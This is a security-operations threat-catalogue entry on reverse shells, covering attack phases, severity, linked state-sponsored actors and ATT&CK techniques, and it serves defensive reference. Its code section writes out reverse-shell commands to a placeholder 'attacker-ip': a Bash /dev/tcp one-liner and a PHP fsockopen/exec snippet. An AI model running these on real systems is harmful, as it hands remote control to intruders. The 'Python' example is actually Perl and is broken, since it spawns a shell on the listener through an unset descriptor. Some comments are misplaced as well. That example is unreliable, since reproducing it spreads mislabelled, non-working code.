# Reverse shell or remote session from compromised host

## Metadata

- **UUID**: `157710ff-962d-4fa3-a516-ac5883f2d5ef`
- **Schema**: `threat::1.0`
- **Version**: `3`
- **Created**: `2023-09-27`
- **Modified**: `2025-02-07`
- **TLP**: clear (`TLP:CLEAR`)
- **Organisation**: EC DIGIT CSOC (`56b0a0f0-b0bc-47d9-bb46-02f80ae2065a`)

## Description
### Threat vector
A reverse shell is a technique that refers to a situation
where adversaries, who have successfully compromised a system,
establish a connection to their own system or server.
This connection allows the adversaries to gain remote access 
and control over the compromised system, enabling them to 
execute commands and perform malicious actions.  

### Command&Control phases
Below are the phases of how a reverse shell works:  

- System compromise: the adversaries must succeed in compromising
  the security of the system. This may involve exploiting vulnerabilities
  in the software, misconfiguration, tricking the user into running a 
  malicious program, or via other ways.  

- Establishing a reverse connection: Once the system has been compromised,
  the adversaries set up a reverse connection from the compromised system
  to their own. This is often done using a malicious application or script
  that runs on the compromised system and communicates with a server controlled 
  by adversaries.  

- Remote control: With the reverse connection established, adversaries can
  have full or partial access and control over the compromised system. This 
  allows them to execute commands, manipulate files, steal information, install
  additional malware, modify configurations and perform other actions according 
  to their goals.  

### Code examples of reverse shells:

#### Example 1 - Bash
      
  Start a listener on the attackers machine
  `nc -nlvp 4444`

  On the target machine, use Bash to establish a connection back to the listener
  `bash -i >& /dev/tcp/attacker-ip/4444 0>&1`

  This code assumes that the attacker has started a listener on their machine using
  the nc (netcat) utility, which is listening on a specified port (in this case, 4444). 
  The second line of code, which is executed on the target machine, uses Bash to open
  a connection back to the listener and establish a command shell. 

#### Example 2 - PHP

  The attacker establishes a command shell on a remote machine by exploiting a
  vulnerability in the target system and using PHP, a server-side scripting language,
  to execute commands on the target machine:

```
  <?php
  // Start a listener on the attacker's machine
  $sock=fsockopen("attacker-ip", 4444);
  exec("/bin/sh -i <&3 >&3 2>&3");
  ?>
```

The PHP code uses the fsockopen() function to open a connection to the listener and
the exec() function to execute the /bin/sh shell and redirect its input, output, and
error streams to the connection with the listener.

#### Example 3 - Python

This code example can be used to establish a command shell on a remote machine.

Start a listener on the attackers machine
```
  use IO::Socket;
  $|=1;
  $socket = new IO::Socket::INET (
      LocalHost => '0.0.0.0',
      LocalPort => '4444',
      Proto => 'tcp',
      Listen => 1,
      Reuse => 1
  );

  Wait for a connection from the target machine
  $new_socket = $socket->accept();

  Open a command shell on the target machine
  system("/bin/sh -i <&3 >&3 2>&3");

  Close the connection
  $new_socket->close();
```

## Criticality
**High** - A High priority incident is likely to result in a demonstrable impact to public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.

## Terrain
> **Adversaries need way to initiate the reverse-shell 
connection on the victim host either through vulnerability 
exploitation, social engineering, or by other means.

Domains: Public Cloud, Private Cloud, Enterprise, Networking
Targets: Personal Information, Workstations, Virtual Machines Host, Web Application Servers, Laptop
Platforms: Windows, Linux, Azure, AWS**

## Threat Assessment
| Dimension | Assessment | Description |
| --- | --- | --- |
| Severity | Significant incident | A cyber attack which has a serious impact on a large organisation or on wider / local government, or which poses a considerable risk to central government or (inter)national essential services. |
| Impact | Impairement; Data Breach; Reputational Damages | - |
| Leverage | Repudiation; Infrastructure Compromise; Information Disclosure; Elevation of privilege; Dwelling; Modify configuration | - |
| Viability | Likely | Probable (probably) - 55-80% |
| Kill Chain | Command & Control | Techniques that allow attackers to communicate with controlled systems within a target network. |

## Actors
| Actor | ID | Source | Description |
| --- | --- | --- | --- |
| APT29 | `misp::b2056ff0-00b9-482e-b11c-c771daa5f28a` | ('misp',) | A 2015 report by F-Secure describe APT29 as: 'The Dukes are a well-resourced, highly dedicated and organized cyberespionage group that we believe has been working for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making. The Dukes show unusual confidence in their ability to continue successfully compromising their targets, as well as in their ability to operate with impunity. The Dukes primarily target Western governments and related organizations, such as government ministries and agencies, political think tanks, and governmental subcontractors. Their targets have also included the governments of members of the Commonwealth of Independent States;Asian, African, and Middle Eastern governments;organizations associated with Chechen extremism;and Russian speakers engaged in the illicit trade of controlled substances and drugs. The Dukes are known to employ a vast arsenal of malware toolsets, which we identify as MiniDuke, CosmicDuke, OnionDuke, CozyDuke, CloudDuke, SeaDuke, HammerDuke, PinchDuke, and GeminiDuke. In recent years, the Dukes have engaged in apparently biannual large - scale spear - phishing campaigns against hundreds or even thousands of recipients associated with governmental institutions and affiliated organizations. These campaigns utilize a smash - and - grab approach involving a fast but noisy breakin followed by the rapid collection and exfiltration of as much data as possible.If the compromised target is discovered to be of value, the Dukes will quickly switch the toolset used and move to using stealthier tactics focused on persistent compromise and long - term intelligence gathering. This threat actor targets government ministries and agencies in the West, Central Asia, East Africa, and the Middle East; Chechen extremist groups; Russian organized crime; and think tanks. It is suspected to be behind the 2015 compromise of unclassified networks at the White House, Department of State, Pentagon, and the Joint Chiefs of Staff. The threat actor includes all of the Dukes tool sets, including MiniDuke, CosmicDuke, OnionDuke, CozyDuke, SeaDuke, CloudDuke (aka MiniDionis), and HammerDuke (aka Hammertoss). ' |
| APT32 | `misp::aa29ae56-e54b-47a2-ad16-d3ab0242d5d7` | ('misp',) | Cyber espionage actors, now designated by FireEye as APT32 (OceanLotus Group), are carrying out intrusions into private sector companies across multiple industries and have also targeted foreign governments, dissidents, and journalists. FireEye assesses that APT32 leverages a unique suite of fully-featured malware, in conjunction with commercially-available tools, to conduct targeted operations that are aligned with Vietnamese state interests. |
| [[Enterprise] APT37](https://attack.mitre.org/groups/G0067) | `att&ck::G0067` | ('att&ck',) | [APT37](https://attack.mitre.org/groups/G0067) is a North Korean state-sponsored cyber espionage group that has been active since at least 2012. The group has targeted victims primarily in South Korea, but also in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East. [APT37](https://attack.mitre.org/groups/G0067) has also been linked to the following campaigns between 2016-2018: Operation Daybreak, Operation Erebus, Golden Time, Evil New Year, Are you Happy?, FreeMilk, North Korean Human Rights, and Evil New Year 2018.(Citation: FireEye APT37 Feb 2018)(Citation: Securelist ScarCruft Jun 2016)(Citation: Talos Group123)  North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups. |
| APT37 | `misp::50cd027f-df14-40b2-aa22-bf5de5061163` | ('misp',) | APT37 has likely been active since at least 2012 and focuses on targeting the public and private sectors primarily in South Korea. In 2017, APT37 expanded its targeting beyond the Korean peninsula to include Japan, Vietnam and the Middle East, and to a wider range of industry verticals, including chemicals, electronics, manufacturing, aerospace, automotive and healthcare entities |
| FIN6 | `misp::647894f6-1723-4cba-aba4-0ef0966d5302` | ('misp',) | FIN is a group targeting financial assets including assets able to do financial transaction including PoS. |
| FIN7 | `misp::00220228-a5a4-4032-a30d-826bb55aa3fb` | ('misp',) | Groups targeting financial organizations or people with significant financial assets. |
| Fox Kitten | `misp::bfb0bc20-5bdf-47ff-b07f-dbd9a3cb9772` | ('misp',) | PIONEER KITTEN is an Iran-based adversary that has been active since at least 2017 and has a suspected nexus to the Iranian government. This adversary appears to be primarily focused on gaining and maintaining access to entities possessing sensitive information of likely intelligence interest to the Iranian government. According to DRAGOS, they also targeted ICS-related entities using known VPN vulnerabilities. They are widely known to use open source penetration testing tools for reconnaissance and to establish encrypted communications. |
| APT15 | `misp::3501fbf2-098f-47e7-be6a-6b0ff5742ce8` | ('misp',) | This threat actor uses phishing techniques to compromise the networks of foreign ministries of European countries for espionage purposes. |
| OilRig | `misp::42be2a84-5a5c-4c6d-9864-3f09d75bb0ba` | ('misp',) | OilRig is an Iranian threat group operating primarily in the Middle East by targeting organizations in this region that are in a variety of different industries; however, this group has occasionally targeted organizations outside of the Middle East as well. It also appears OilRig carries out supply chain attacks, where the threat group leverages the trust relationship between organizations to attack their primary targets.   OilRig is an active and organized threat group, which is evident based on their systematic targeting of specific organizations that appear to be carefully chosen for strategic purposes. Attacks attributed to this group primarily rely on social engineering to exploit the human rather than software vulnerabilities; however, on occasion this group has used recently patched vulnerabilities in the delivery phase of their attacks. The lack of software vulnerability exploitation does not necessarily suggest a lack of sophistication, as OilRig has shown maturity in other aspects of their operations. Such maturities involve:  -Organized evasion testing used the during development of their tools. -Use of custom DNS Tunneling protocols for command and control (C2) and data exfiltration. -Custom web-shells and backdoors used to persistently access servers.  OilRig relies on stolen account credentials for lateral movement. After OilRig gains access to a system, they use credential dumping tools, such as Mimikatz, to steal credentials to accounts logged into the compromised system. The group uses these credentials to access and to move laterally to other systems on the network. After obtaining credentials from a system, operators in this group prefer to use tools other than their backdoors to access the compromised systems, such as remote desktop and putty. OilRig also uses phishing sites to harvest credentials to individuals at targeted organizations to gain access to internet accessible resources, such as Outlook Web Access.    Since at least 2014, an Iranian threat group tracked by FireEye as APT34 has conducted reconnaissance aligned with the strategic interests of Iran. The group conducts operations primarily in the Middle East, targeting financial, government, energy, chemical, telecommunications and other industries. Repeated targeting of Middle Eastern financial, energy and government organizations leads FireEye to assess that those sectors are a primary concern of APT34. The use of infrastructure tied to Iranian operations, timing and alignment with the national interests of Iran also lead FireEye to assess that APT34 acts on behalf of the Iranian government. |
| Whitefly | `misp::943f490e-ac7f-40fe-b6f3-33e2623649d2` | ('misp',) | In July 2018, an attack on Singapore’s largest public health organization, SingHealth, resulted in a reported 1.5 million patient records being stolen. Until now, nothing was known about who was responsible for this attack. Symantec researchers have discovered that this attack group, which we call Whitefly, has been operating since at least 2017, has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. |

## ATT&CK Techniques
| Technique | Name | Description |
| --- | --- | --- |
| `T1071.001` | [Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001) | Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.   Protocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. |
| `T1571` | [Non-Standard Port](https://attack.mitre.org/techniques/T1571) | Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.  Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti) |
| `T1572` | [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) | Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet.   There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling)(Citation: Sygnia Abyss Locker 2025)   [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19)   Adversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. |
| `T1059` | [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) | Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).  There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).  Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python) |
